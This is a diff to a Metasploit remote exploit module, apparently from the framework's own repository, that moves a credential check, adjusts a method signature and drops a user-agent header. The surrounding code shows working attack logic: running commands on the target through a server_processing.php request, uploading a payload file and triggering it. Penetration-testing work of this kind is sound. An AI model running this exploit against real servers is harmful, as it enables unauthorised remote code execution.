@@ -76,14 +76,6 @@ class MetasploitModule < Msf::Exploit::Remote
     ])
   end
 
-  def setup
-    # check for login credentials couple.
-    if ((datastore['USERNAME']) && (datastore['PASSWORD'].nil?)) ||
-       ((datastore['PASSWORD']) && (datastore['USERNAME'].nil?))
-       fail_with(Failure::BadConfig, 'Bad login credentials couple')
-    end
-  end
-
   def get_os
     received = parse_response(execute_command('echo $PATH'))
     ## Not linux, check Windows.
@@ -115,7 +107,7 @@ class MetasploitModule < Msf::Exploit::Remote
     return js.gsub('", }', '"}')
   end
 
-  def execute_command(command)
+  def execute_command(command, opts = {})
     junk = rand(1_000)
     requested_payload = {
       'table' => 'passwords',
@@ -165,6 +157,12 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def check
+    # check for login credentials couple.
+    if ((datastore['USERNAME']) && (datastore['PASSWORD'].nil?)) ||
+      ((datastore['PASSWORD']) && (datastore['USERNAME'].nil?))
+      fail_with(Failure::BadConfig, 'Bad login credentials couple')
+    end
+
     received = send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php')
@@ -226,7 +224,7 @@ class MetasploitModule < Msf::Exploit::Remote
       received = execute_command(cmd)
       unless (received) && (received.code == 200) && (received.body.include?('recordsTotal'))
         print_error('Payload upload failed :(')
-        return(Msf::Exploit::Failed)
+        return Msf::Exploit::Failed
       end
       print_status("Payload uploaded as: #{file_name}")
       register_file_for_cleanup file_name
@@ -234,8 +232,7 @@ class MetasploitModule < Msf::Exploit::Remote
       ## Triggering.
       send_request_cgi({
         'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', file_name),
-        'agent' => datastore['USERAGENT']
+        'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', file_name)
       }, 2.5)
     end
   end
